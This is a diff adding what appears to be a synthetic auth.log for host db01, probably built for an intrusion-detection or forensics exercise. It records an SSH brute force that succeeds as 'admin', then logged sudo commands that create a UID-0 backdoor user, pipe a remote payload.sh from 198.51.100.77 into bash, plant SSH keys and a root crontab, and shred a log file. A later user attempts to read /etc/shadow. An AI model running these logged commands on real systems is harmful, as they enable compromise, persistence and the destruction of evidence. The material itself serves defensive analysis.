@@ -1,0 +1,277 @@
+Oct 28 00:09:00 db01 CRON[4006]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 00:09:01 db01 CRON[4006]: pam_unix(cron:session): session closed for user root
+Oct 28 01:00:00 db01 sshd[4535]: Accepted publickey for admin from 10.20.0.15 port 46648 ssh2: ED25519 SHA256:55504ce4330e52e2
+Oct 28 01:00:00 db01 sshd[4535]: pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)
+Oct 28 01:00:01 db01 systemd-logind[4571]: New session 73 of user admin.
+Oct 28 01:01:02 db01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 28 01:09:00 db01 CRON[4014]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 01:09:01 db01 CRON[4014]: pam_unix(cron:session): session closed for user root
+Oct 28 01:12:00 db01 sshd[4535]: Received disconnect from 10.20.0.15 port 46648:11: disconnected by user
+Oct 28 01:12:00 db01 sshd[4535]: pam_unix(sshd:session): session closed for user admin
+Oct 28 02:09:00 db01 CRON[4022]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 02:09:01 db01 CRON[4022]: pam_unix(cron:session): session closed for user root
+Oct 28 02:58:00 db01 sshd[4575]: Failed password for admin from 203.0.113.45 port 38558 ssh2
+Oct 28 02:58:04 db01 sshd[4575]: Connection closed by authenticating user admin 203.0.113.45 port 38558 [preauth]
+Oct 28 02:58:13 db01 sshd[4610]: Failed password for admin from 203.0.113.45 port 49487 ssh2
+Oct 28 02:58:17 db01 sshd[4610]: Connection closed by authenticating user admin 203.0.113.45 port 49487 [preauth]
+Oct 28 02:58:26 db01 sshd[4648]: Failed password for postgres from 203.0.113.45 port 38726 ssh2
+Oct 28 02:58:29 db01 sshd[4648]: message repeated 2 times: [ Failed password for postgres from 203.0.113.45 port 38726 ssh2]
+Oct 28 02:58:34 db01 sshd[4648]: Connection closed by authenticating user postgres 203.0.113.45 port 38726 [preauth]
+Oct 28 02:58:45 db01 sshd[4684]: Invalid user test from 203.0.113.45 port 57766
+Oct 28 02:58:45 db01 sshd[4684]: Failed password for invalid user test from 203.0.113.45 port 57766 ssh2
+Oct 28 02:58:48 db01 sshd[4684]: message repeated 2 times: [ Failed password for invalid user test from 203.0.113.45 port 57766 ssh2]
+Oct 28 02:58:53 db01 sshd[4684]: Connection closed by invalid user test 203.0.113.45 port 57766 [preauth]
+Oct 28 02:59:02 db01 sshd[4710]: Failed password for postgres from 203.0.113.45 port 60914 ssh2
+Oct 28 02:59:05 db01 sshd[4710]: message repeated 1 times: [ Failed password for postgres from 203.0.113.45 port 60914 ssh2]
+Oct 28 02:59:08 db01 sshd[4710]: Connection closed by authenticating user postgres 203.0.113.45 port 60914 [preauth]
+Oct 28 02:59:19 db01 sshd[4742]: Failed password for admin from 203.0.113.45 port 54228 ssh2
+Oct 28 02:59:22 db01 sshd[4742]: message repeated 1 times: [ Failed password for admin from 203.0.113.45 port 54228 ssh2]
+Oct 28 02:59:25 db01 sshd[4742]: Connection closed by authenticating user admin 203.0.113.45 port 54228 [preauth]
+Oct 28 02:59:37 db01 sshd[4762]: Failed password for admin from 203.0.113.45 port 49088 ssh2
+Oct 28 02:59:40 db01 sshd[4762]: message repeated 1 times: [ Failed password for admin from 203.0.113.45 port 49088 ssh2]
+Oct 28 02:59:43 db01 sshd[4762]: Connection closed by authenticating user admin 203.0.113.45 port 49088 [preauth]
+Oct 28 02:59:55 db01 sshd[4794]: Failed password for postgres from 203.0.113.45 port 47874 ssh2
+Oct 28 02:59:58 db01 sshd[4794]: message repeated 1 times: [ Failed password for postgres from 203.0.113.45 port 47874 ssh2]
+Oct 28 03:00:01 db01 sshd[4794]: Connection closed by authenticating user postgres 203.0.113.45 port 47874 [preauth]
+Oct 28 03:00:10 db01 sshd[4832]: Failed password for postgres from 203.0.113.45 port 56484 ssh2
+Oct 28 03:00:13 db01 sshd[4832]: message repeated 2 times: [ Failed password for postgres from 203.0.113.45 port 56484 ssh2]
+Oct 28 03:00:18 db01 sshd[4832]: Connection closed by authenticating user postgres 203.0.113.45 port 56484 [preauth]
+Oct 28 03:00:29 db01 sshd[4849]: Invalid user test from 203.0.113.45 port 43406
+Oct 28 03:00:29 db01 sshd[4849]: Failed password for invalid user test from 203.0.113.45 port 43406 ssh2
+Oct 28 03:00:32 db01 sshd[4849]: message repeated 2 times: [ Failed password for invalid user test from 203.0.113.45 port 43406 ssh2]
+Oct 28 03:00:37 db01 sshd[4849]: Connection closed by invalid user test 203.0.113.45 port 43406 [preauth]
+Oct 28 03:00:52 db01 sshd[4869]: Failed password for admin from 203.0.113.45 port 58097 ssh2
+Oct 28 03:00:55 db01 sshd[4869]: message repeated 2 times: [ Failed password for admin from 203.0.113.45 port 58097 ssh2]
+Oct 28 03:01:00 db01 sshd[4869]: Connection closed by authenticating user admin 203.0.113.45 port 58097 [preauth]
+Oct 28 03:01:11 db01 sshd[4904]: Invalid user ubuntu from 203.0.113.45 port 51189
+Oct 28 03:01:11 db01 sshd[4904]: Failed password for invalid user ubuntu from 203.0.113.45 port 51189 ssh2
+Oct 28 03:01:14 db01 sshd[4904]: message repeated 1 times: [ Failed password for invalid user ubuntu from 203.0.113.45 port 51189 ssh2]
+Oct 28 03:01:17 db01 sshd[4904]: Connection closed by invalid user ubuntu 203.0.113.45 port 51189 [preauth]
+Oct 28 03:01:29 db01 sshd[4944]: Failed password for postgres from 203.0.113.45 port 46093 ssh2
+Oct 28 03:01:32 db01 sshd[4944]: message repeated 2 times: [ Failed password for postgres from 203.0.113.45 port 46093 ssh2]
+Oct 28 03:01:37 db01 sshd[4944]: Connection closed by authenticating user postgres 203.0.113.45 port 46093 [preauth]
+Oct 28 03:01:45 db01 sshd[4979]: Failed password for admin from 203.0.113.45 port 44780 ssh2
+Oct 28 03:01:48 db01 sshd[4979]: message repeated 1 times: [ Failed password for admin from 203.0.113.45 port 44780 ssh2]
+Oct 28 03:01:51 db01 sshd[4979]: Connection closed by authenticating user admin 203.0.113.45 port 44780 [preauth]
+Oct 28 03:02:05 db01 sshd[5003]: Failed password for postgres from 203.0.113.45 port 56555 ssh2
+Oct 28 03:02:09 db01 sshd[5003]: Connection closed by authenticating user postgres 203.0.113.45 port 56555 [preauth]
+Oct 28 03:02:13 db01 sshd[5012]: Failed password for admin from 203.0.113.45 port 34693 ssh2
+Oct 28 03:02:16 db01 sshd[5012]: message repeated 2 times: [ Failed password for admin from 203.0.113.45 port 34693 ssh2]
+Oct 28 03:02:21 db01 sshd[5012]: Connection closed by authenticating user admin 203.0.113.45 port 34693 [preauth]
+Oct 28 03:02:34 db01 sshd[5052]: Failed password for root from 203.0.113.45 port 40193 ssh2
+Oct 28 03:02:37 db01 sshd[5052]: message repeated 1 times: [ Failed password for root from 203.0.113.45 port 40193 ssh2]
+Oct 28 03:02:40 db01 sshd[5052]: Connection closed by authenticating user root 203.0.113.45 port 40193 [preauth]
+Oct 28 03:02:54 db01 sshd[5063]: Failed password for root from 203.0.113.45 port 60750 ssh2
+Oct 28 03:02:57 db01 sshd[5063]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 60750 ssh2]
+Oct 28 03:03:02 db01 sshd[5063]: Connection closed by authenticating user root 203.0.113.45 port 60750 [preauth]
+Oct 28 03:03:10 db01 sshd[5069]: Failed password for admin from 203.0.113.45 port 46626 ssh2
+Oct 28 03:03:14 db01 sshd[5069]: Connection closed by authenticating user admin 203.0.113.45 port 46626 [preauth]
+Oct 28 03:03:29 db01 sshd[5095]: Failed password for root from 203.0.113.45 port 44571 ssh2
+Oct 28 03:03:33 db01 sshd[5095]: Connection closed by authenticating user root 203.0.113.45 port 44571 [preauth]
+Oct 28 03:03:39 db01 sshd[5099]: Failed password for admin from 203.0.113.45 port 35484 ssh2
+Oct 28 03:03:42 db01 sshd[5099]: message repeated 2 times: [ Failed password for admin from 203.0.113.45 port 35484 ssh2]
+Oct 28 03:03:47 db01 sshd[5099]: Connection closed by authenticating user admin 203.0.113.45 port 35484 [preauth]
+Oct 28 03:03:52 db01 sshd[5104]: Failed password for root from 203.0.113.45 port 56669 ssh2
+Oct 28 03:03:56 db01 sshd[5104]: Connection closed by authenticating user root 203.0.113.45 port 56669 [preauth]
+Oct 28 03:04:00 db01 sshd[5115]: Invalid user ubuntu from 203.0.113.45 port 59419
+Oct 28 03:04:00 db01 sshd[5115]: Failed password for invalid user ubuntu from 203.0.113.45 port 59419 ssh2
+Oct 28 03:04:03 db01 sshd[5115]: message repeated 1 times: [ Failed password for invalid user ubuntu from 203.0.113.45 port 59419 ssh2]
+Oct 28 03:04:06 db01 sshd[5115]: Connection closed by invalid user ubuntu 203.0.113.45 port 59419 [preauth]
+Oct 28 03:04:12 db01 sshd[5118]: Failed password for admin from 203.0.113.45 port 45402 ssh2
+Oct 28 03:04:15 db01 sshd[5118]: message repeated 2 times: [ Failed password for admin from 203.0.113.45 port 45402 ssh2]
+Oct 28 03:04:20 db01 sshd[5118]: Connection closed by authenticating user admin 203.0.113.45 port 45402 [preauth]
+Oct 28 03:04:33 db01 sshd[5130]: Failed password for root from 203.0.113.45 port 33956 ssh2
+Oct 28 03:04:37 db01 sshd[5130]: Connection closed by authenticating user root 203.0.113.45 port 33956 [preauth]
+Oct 28 03:04:41 db01 sshd[5140]: Invalid user ubuntu from 203.0.113.45 port 42140
+Oct 28 03:04:41 db01 sshd[5140]: Failed password for invalid user ubuntu from 203.0.113.45 port 42140 ssh2
+Oct 28 03:04:44 db01 sshd[5140]: message repeated 2 times: [ Failed password for invalid user ubuntu from 203.0.113.45 port 42140 ssh2]
+Oct 28 03:04:49 db01 sshd[5140]: Connection closed by invalid user ubuntu 203.0.113.45 port 42140 [preauth]
+Oct 28 03:04:58 db01 sshd[5162]: Invalid user test from 203.0.113.45 port 47469
+Oct 28 03:04:58 db01 sshd[5162]: Failed password for invalid user test from 203.0.113.45 port 47469 ssh2
+Oct 28 03:05:02 db01 sshd[5162]: Connection closed by invalid user test 203.0.113.45 port 47469 [preauth]
+Oct 28 03:05:14 db01 sshd[5167]: Failed password for postgres from 203.0.113.45 port 41416 ssh2
+Oct 28 03:05:17 db01 sshd[5167]: message repeated 2 times: [ Failed password for postgres from 203.0.113.45 port 41416 ssh2]
+Oct 28 03:05:22 db01 sshd[5167]: Connection closed by authenticating user postgres 203.0.113.45 port 41416 [preauth]
+Oct 28 03:05:32 db01 sshd[5179]: Failed password for postgres from 203.0.113.45 port 48260 ssh2
+Oct 28 03:05:35 db01 sshd[5179]: message repeated 2 times: [ Failed password for postgres from 203.0.113.45 port 48260 ssh2]
+Oct 28 03:05:40 db01 sshd[5179]: Connection closed by authenticating user postgres 203.0.113.45 port 48260 [preauth]
+Oct 28 03:05:47 db01 sshd[5202]: Failed password for root from 203.0.113.45 port 60240 ssh2
+Oct 28 03:05:50 db01 sshd[5202]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 60240 ssh2]
+Oct 28 03:05:55 db01 sshd[5202]: Connection closed by authenticating user root 203.0.113.45 port 60240 [preauth]
+Oct 28 03:06:00 db01 sshd[5213]: Failed password for root from 203.0.113.45 port 49751 ssh2
+Oct 28 03:06:03 db01 sshd[5213]: message repeated 1 times: [ Failed password for root from 203.0.113.45 port 49751 ssh2]
+Oct 28 03:06:06 db01 sshd[5213]: Connection closed by authenticating user root 203.0.113.45 port 49751 [preauth]
+Oct 28 03:06:19 db01 sshd[5248]: Invalid user test from 203.0.113.45 port 43514
+Oct 28 03:06:19 db01 sshd[5248]: Failed password for invalid user test from 203.0.113.45 port 43514 ssh2
+Oct 28 03:06:22 db01 sshd[5248]: message repeated 1 times: [ Failed password for invalid user test from 203.0.113.45 port 43514 ssh2]
+Oct 28 03:06:25 db01 sshd[5248]: Connection closed by invalid user test 203.0.113.45 port 43514 [preauth]
+Oct 28 03:06:31 db01 sshd[5267]: Invalid user ubuntu from 203.0.113.45 port 52627
+Oct 28 03:06:31 db01 sshd[5267]: Failed password for invalid user ubuntu from 203.0.113.45 port 52627 ssh2
+Oct 28 03:06:34 db01 sshd[5267]: message repeated 1 times: [ Failed password for invalid user ubuntu from 203.0.113.45 port 52627 ssh2]
+Oct 28 03:06:37 db01 sshd[5267]: Connection closed by invalid user ubuntu 203.0.113.45 port 52627 [preauth]
+Oct 28 03:06:47 db01 sshd[5305]: Failed password for root from 203.0.113.45 port 37374 ssh2
+Oct 28 03:06:50 db01 sshd[5305]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 37374 ssh2]
+Oct 28 03:06:55 db01 sshd[5305]: Connection closed by authenticating user root 203.0.113.45 port 37374 [preauth]
+Oct 28 03:07:09 db01 sshd[5310]: Failed password for root from 203.0.113.45 port 37083 ssh2
+Oct 28 03:07:12 db01 sshd[5310]: message repeated 1 times: [ Failed password for root from 203.0.113.45 port 37083 ssh2]
+Oct 28 03:07:15 db01 sshd[5310]: Connection closed by authenticating user root 203.0.113.45 port 37083 [preauth]
+Oct 28 03:07:21 db01 sshd[5342]: Failed password for admin from 203.0.113.45 port 53578 ssh2
+Oct 28 03:07:25 db01 sshd[5342]: Connection closed by authenticating user admin 203.0.113.45 port 53578 [preauth]
+Oct 28 03:07:32 db01 sshd[5347]: Failed password for postgres from 203.0.113.45 port 40853 ssh2
+Oct 28 03:07:35 db01 sshd[5347]: message repeated 2 times: [ Failed password for postgres from 203.0.113.45 port 40853 ssh2]
+Oct 28 03:07:40 db01 sshd[5347]: Connection closed by authenticating user postgres 203.0.113.45 port 40853 [preauth]
+Oct 28 03:07:47 db01 sshd[5366]: Invalid user test from 203.0.113.45 port 35403
+Oct 28 03:07:47 db01 sshd[5366]: Failed password for invalid user test from 203.0.113.45 port 35403 ssh2
+Oct 28 03:07:51 db01 sshd[5366]: Connection closed by invalid user test 203.0.113.45 port 35403 [preauth]
+Oct 28 03:08:04 db01 sshd[5392]: Failed password for admin from 203.0.113.45 port 41176 ssh2
+Oct 28 03:08:07 db01 sshd[5392]: message repeated 2 times: [ Failed password for admin from 203.0.113.45 port 41176 ssh2]
+Oct 28 03:08:12 db01 sshd[5392]: Connection closed by authenticating user admin 203.0.113.45 port 41176 [preauth]
+Oct 28 03:08:26 db01 sshd[5428]: Invalid user test from 203.0.113.45 port 57366
+Oct 28 03:08:26 db01 sshd[5428]: Failed password for invalid user test from 203.0.113.45 port 57366 ssh2
+Oct 28 03:08:29 db01 sshd[5428]: message repeated 1 times: [ Failed password for invalid user test from 203.0.113.45 port 57366 ssh2]
+Oct 28 03:08:32 db01 sshd[5428]: Connection closed by invalid user test 203.0.113.45 port 57366 [preauth]
+Oct 28 03:08:36 db01 sshd[5455]: Failed password for admin from 203.0.113.45 port 46161 ssh2
+Oct 28 03:08:40 db01 sshd[5455]: Connection closed by authenticating user admin 203.0.113.45 port 46161 [preauth]
+Oct 28 03:08:46 db01 sshd[5463]: Failed password for root from 203.0.113.45 port 40660 ssh2
+Oct 28 03:08:49 db01 sshd[5463]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 40660 ssh2]
+Oct 28 03:08:54 db01 sshd[5463]: Connection closed by authenticating user root 203.0.113.45 port 40660 [preauth]
+Oct 28 03:08:59 db01 sshd[5477]: Failed password for root from 203.0.113.45 port 57363 ssh2
+Oct 28 03:09:00 db01 CRON[4048]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 03:09:01 db01 CRON[4048]: pam_unix(cron:session): session closed for user root
+Oct 28 03:09:03 db01 sshd[5477]: Connection closed by authenticating user root 203.0.113.45 port 57363 [preauth]
+Oct 28 03:09:10 db01 sshd[5481]: Failed password for root from 203.0.113.45 port 49831 ssh2
+Oct 28 03:09:14 db01 sshd[5481]: Connection closed by authenticating user root 203.0.113.45 port 49831 [preauth]
+Oct 28 03:09:28 db01 sshd[5503]: Invalid user test from 203.0.113.45 port 50316
+Oct 28 03:09:28 db01 sshd[5503]: Failed password for invalid user test from 203.0.113.45 port 50316 ssh2
+Oct 28 03:09:31 db01 sshd[5503]: message repeated 1 times: [ Failed password for invalid user test from 203.0.113.45 port 50316 ssh2]
+Oct 28 03:09:34 db01 sshd[5503]: Connection closed by invalid user test 203.0.113.45 port 50316 [preauth]
+Oct 28 03:09:48 db01 sshd[5519]: Invalid user test from 203.0.113.45 port 56653
+Oct 28 03:09:48 db01 sshd[5519]: Failed password for invalid user test from 203.0.113.45 port 56653 ssh2
+Oct 28 03:09:52 db01 sshd[5519]: Connection closed by invalid user test 203.0.113.45 port 56653 [preauth]
+Oct 28 03:10:02 db01 sshd[5523]: Invalid user test from 203.0.113.45 port 51808
+Oct 28 03:10:02 db01 sshd[5523]: Failed password for invalid user test from 203.0.113.45 port 51808 ssh2
+Oct 28 03:10:05 db01 sshd[5523]: message repeated 2 times: [ Failed password for invalid user test from 203.0.113.45 port 51808 ssh2]
+Oct 28 03:10:10 db01 sshd[5523]: Connection closed by invalid user test 203.0.113.45 port 51808 [preauth]
+Oct 28 03:10:23 db01 sshd[5559]: Failed password for root from 203.0.113.45 port 51817 ssh2
+Oct 28 03:10:26 db01 sshd[5559]: message repeated 1 times: [ Failed password for root from 203.0.113.45 port 51817 ssh2]
+Oct 28 03:10:29 db01 sshd[5559]: Connection closed by authenticating user root 203.0.113.45 port 51817 [preauth]
+Oct 28 03:10:35 db01 sshd[5592]: Failed password for root from 203.0.113.45 port 44767 ssh2
+Oct 28 03:10:38 db01 sshd[5592]: message repeated 2 times: [ Failed password for root from 203.0.113.45 port 44767 ssh2]
+Oct 28 03:10:43 db01 sshd[5592]: Connection closed by authenticating user root 203.0.113.45 port 44767 [preauth]
+Oct 28 03:10:47 db01 sshd[5618]: Failed password for postgres from 203.0.113.45 port 42256 ssh2
+Oct 28 03:10:51 db01 sshd[5618]: Connection closed by authenticating user postgres 203.0.113.45 port 42256 [preauth]
+Oct 28 03:11:06 db01 sshd[5622]: Invalid user ubuntu from 203.0.113.45 port 55224
+Oct 28 03:11:06 db01 sshd[5622]: Failed password for invalid user ubuntu from 203.0.113.45 port 55224 ssh2
+Oct 28 03:11:09 db01 sshd[5622]: message repeated 1 times: [ Failed password for invalid user ubuntu from 203.0.113.45 port 55224 ssh2]
+Oct 28 03:11:12 db01 sshd[5622]: Connection closed by invalid user ubuntu 203.0.113.45 port 55224 [preauth]
+Oct 28 03:11:22 db01 sshd[5644]: Failed password for root from 203.0.113.45 port 39268 ssh2
+Oct 28 03:11:26 db01 sshd[5644]: Connection closed by authenticating user root 203.0.113.45 port 39268 [preauth]
+Oct 28 03:11:40 db01 sshd[5650]: Failed password for root from 203.0.113.45 port 46224 ssh2
+Oct 28 03:11:43 db01 sshd[5650]: message repeated 1 times: [ Failed password for root from 203.0.113.45 port 46224 ssh2]
+Oct 28 03:11:46 db01 sshd[5650]: Connection closed by authenticating user root 203.0.113.45 port 46224 [preauth]
+Oct 28 03:12:00 db01 sshd[5666]: Invalid user test from 203.0.113.45 port 52059
+Oct 28 03:12:00 db01 sshd[5666]: Failed password for invalid user test from 203.0.113.45 port 52059 ssh2
+Oct 28 03:12:03 db01 sshd[5666]: message repeated 1 times: [ Failed password for invalid user test from 203.0.113.45 port 52059 ssh2]
+Oct 28 03:12:06 db01 sshd[5666]: Connection closed by invalid user test 203.0.113.45 port 52059 [preauth]
+Oct 28 03:12:19 db01 sshd[5687]: Failed password for root from 203.0.113.45 port 33559 ssh2
+Oct 28 03:12:23 db01 sshd[5687]: Connection closed by authenticating user root 203.0.113.45 port 33559 [preauth]
+Oct 28 03:12:32 db01 sshd[5694]: Invalid user ubuntu from 203.0.113.45 port 39949
+Oct 28 03:12:32 db01 sshd[5694]: Failed password for invalid user ubuntu from 203.0.113.45 port 39949 ssh2
+Oct 28 03:12:35 db01 sshd[5694]: message repeated 2 times: [ Failed password for invalid user ubuntu from 203.0.113.45 port 39949 ssh2]
+Oct 28 03:12:40 db01 sshd[5694]: Connection closed by invalid user ubuntu 203.0.113.45 port 39949 [preauth]
+Oct 28 03:12:51 db01 sshd[5733]: Failed password for admin from 203.0.113.45 port 45003 ssh2
+Oct 28 03:12:55 db01 sshd[5733]: Connection closed by authenticating user admin 203.0.113.45 port 45003 [preauth]
+Oct 28 03:13:05 db01 sshd[5758]: Invalid user test from 203.0.113.45 port 45712
+Oct 28 03:13:05 db01 sshd[5758]: Failed password for invalid user test from 203.0.113.45 port 45712 ssh2
+Oct 28 03:13:09 db01 sshd[5758]: Connection closed by invalid user test 203.0.113.45 port 45712 [preauth]
+Oct 28 03:13:14 db01 sshd[5768]: Invalid user ubuntu from 203.0.113.45 port 35406
+Oct 28 03:13:14 db01 sshd[5768]: Failed password for invalid user ubuntu from 203.0.113.45 port 35406 ssh2
+Oct 28 03:13:18 db01 sshd[5768]: Connection closed by invalid user ubuntu 203.0.113.45 port 35406 [preauth]
+Oct 28 03:14:07 db01 sshd[7781]: Failed password for admin from 203.0.113.45 port 51122 ssh2
+Oct 28 03:14:11 db01 sshd[7781]: Accepted password for admin from 203.0.113.45 port 51122 ssh2
+Oct 28 03:14:11 db01 sshd[7781]: pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)
+Oct 28 03:14:12 db01 systemd-logind[611]: New session 41 of user admin.
+Oct 28 03:15:02 db01 sudo:    admin : TTY=pts/2 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/id
+Oct 28 03:15:20 db01 sudo:    admin : TTY=pts/3 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Oct 28 03:16:41 db01 useradd[7810]: new group: name=sysadm, GID=1002
+Oct 28 03:16:41 db01 useradd[7810]: new user: name=sysadm, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1
+Oct 28 03:17:05 db01 usermod[7815]: add 'sysadm' to group 'sudo'
+Oct 28 03:17:05 db01 usermod[7815]: add 'sysadm' to shadow group 'sudo'
+Oct 28 03:17:30 db01 passwd[7820]: pam_unix(passwd:chauthtok): password changed for sysadm
+Oct 28 03:19:12 db01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/bash -c curl -fsSL http://198.51.100.77/payload.sh | bash
+Oct 28 03:21:40 db01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys
+Oct 28 03:24:03 db01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/crontab -u root /tmp/.c
+Oct 28 03:27:55 db01 sudo:    admin : TTY=pts/3 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1
+Oct 28 03:29:10 db01 sshd[7781]: pam_unix(sshd:session): session closed for user admin
+Oct 28 04:09:00 db01 CRON[4061]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 04:09:01 db01 CRON[4061]: pam_unix(cron:session): session closed for user root
+Oct 28 05:02:00 db01 sshd[5773]: Failed password for root from 198.51.100.12 port 56476 ssh2
+Oct 28 05:02:03 db01 sshd[5773]: message repeated 2 times: [ Failed password for root from 198.51.100.12 port 56476 ssh2]
+Oct 28 05:02:08 db01 sshd[5773]: Connection closed by authenticating user root 198.51.100.12 port 56476 [preauth]
+Oct 28 05:02:28 db01 sshd[5794]: Failed password for root from 198.51.100.12 port 44485 ssh2
+Oct 28 05:02:31 db01 sshd[5794]: message repeated 2 times: [ Failed password for root from 198.51.100.12 port 44485 ssh2]
+Oct 28 05:02:36 db01 sshd[5794]: Connection closed by authenticating user root 198.51.100.12 port 44485 [preauth]
+Oct 28 05:02:55 db01 sshd[5806]: Failed password for root from 198.51.100.12 port 58940 ssh2
+Oct 28 05:02:58 db01 sshd[5806]: message repeated 2 times: [ Failed password for root from 198.51.100.12 port 58940 ssh2]
+Oct 28 05:03:03 db01 sshd[5806]: Connection closed by authenticating user root 198.51.100.12 port 58940 [preauth]
+Oct 28 05:03:19 db01 sshd[5826]: Failed password for root from 198.51.100.12 port 48634 ssh2
+Oct 28 05:03:22 db01 sshd[5826]: message repeated 2 times: [ Failed password for root from 198.51.100.12 port 48634 ssh2]
+Oct 28 05:03:27 db01 sshd[5826]: Connection closed by authenticating user root 198.51.100.12 port 48634 [preauth]
+Oct 28 05:03:47 db01 sshd[5855]: Failed password for root from 198.51.100.12 port 48893 ssh2
+Oct 28 05:03:50 db01 sshd[5855]: message repeated 2 times: [ Failed password for root from 198.51.100.12 port 48893 ssh2]
+Oct 28 05:03:55 db01 sshd[5855]: Connection closed by authenticating user root 198.51.100.12 port 48893 [preauth]
+Oct 28 05:04:09 db01 sshd[5883]: Failed password for root from 198.51.100.12 port 40357 ssh2
+Oct 28 05:04:12 db01 sshd[5883]: message repeated 2 times: [ Failed password for root from 198.51.100.12 port 40357 ssh2]
+Oct 28 05:04:17 db01 sshd[5883]: Connection closed by authenticating user root 198.51.100.12 port 40357 [preauth]
+Oct 28 05:09:00 db01 CRON[4083]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 05:09:01 db01 CRON[4083]: pam_unix(cron:session): session closed for user root
+Oct 28 06:09:00 db01 CRON[4102]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 06:09:01 db01 CRON[4102]: pam_unix(cron:session): session closed for user root
+Oct 28 07:09:00 db01 CRON[4118]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 07:09:01 db01 CRON[4118]: pam_unix(cron:session): session closed for user root
+Oct 28 08:09:00 db01 CRON[4123]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 08:09:01 db01 CRON[4123]: pam_unix(cron:session): session closed for user root
+Oct 28 09:09:00 db01 CRON[4163]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 09:09:01 db01 CRON[4163]: pam_unix(cron:session): session closed for user root
+Oct 28 09:12:00 db01 sshd[5917]: Accepted publickey for alice from 10.20.0.31 port 52315 ssh2: ED25519 SHA256:6f6368420b806e8c
+Oct 28 09:12:00 db01 sshd[5917]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Oct 28 09:12:01 db01 systemd-logind[5947]: New session 0 of user alice.
+Oct 28 09:15:18 db01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 50 /var/log/auth.log
+Oct 28 09:37:00 db01 sshd[5917]: Received disconnect from 10.20.0.31 port 52315:11: disconnected by user
+Oct 28 09:37:00 db01 sshd[5917]: pam_unix(sshd:session): session closed for user alice
+Oct 28 10:09:00 db01 CRON[4176]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 10:09:01 db01 CRON[4176]: pam_unix(cron:session): session closed for user root
+Oct 28 11:09:00 db01 CRON[4206]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 11:09:01 db01 CRON[4206]: pam_unix(cron:session): session closed for user root
+Oct 28 11:40:00 db01 sshd[5987]: Accepted publickey for bob from 10.20.0.44 port 56616 ssh2: ED25519 SHA256:a4d45ed1e06b6493
+Oct 28 11:40:00 db01 sshd[5987]: pam_unix(sshd:session): session opened for user bob(uid=1003) by (uid=0)
+Oct 28 11:40:01 db01 systemd-logind[5996]: New session 70 of user bob.
+Oct 28 11:43:00 db01 sudo:    bob : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 28 11:44:00 db01 sudo:    bob : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 28 11:46:00 db01 sudo:    bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
+Oct 28 12:00:00 db01 sshd[5987]: Received disconnect from 10.20.0.44 port 56616:11: disconnected by user
+Oct 28 12:00:00 db01 sshd[5987]: pam_unix(sshd:session): session closed for user bob
+Oct 28 12:09:00 db01 CRON[4234]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 12:09:01 db01 CRON[4234]: pam_unix(cron:session): session closed for user root
+Oct 28 13:09:00 db01 CRON[4269]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 13:09:01 db01 CRON[4269]: pam_unix(cron:session): session closed for user root
+Oct 28 14:09:00 db01 CRON[4295]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 14:09:01 db01 CRON[4295]: pam_unix(cron:session): session closed for user root
+Oct 28 15:09:00 db01 CRON[4332]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 15:09:01 db01 CRON[4332]: pam_unix(cron:session): session closed for user root
+Oct 28 16:09:00 db01 CRON[4363]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 16:09:01 db01 CRON[4363]: pam_unix(cron:session): session closed for user root
+Oct 28 17:09:00 db01 CRON[4398]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 17:09:01 db01 CRON[4398]: pam_unix(cron:session): session closed for user root
+Oct 28 18:09:00 db01 CRON[4418]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 18:09:01 db01 CRON[4418]: pam_unix(cron:session): session closed for user root
+Oct 28 19:09:00 db01 CRON[4423]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 19:09:01 db01 CRON[4423]: pam_unix(cron:session): session closed for user root
+Oct 28 20:09:00 db01 CRON[4427]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
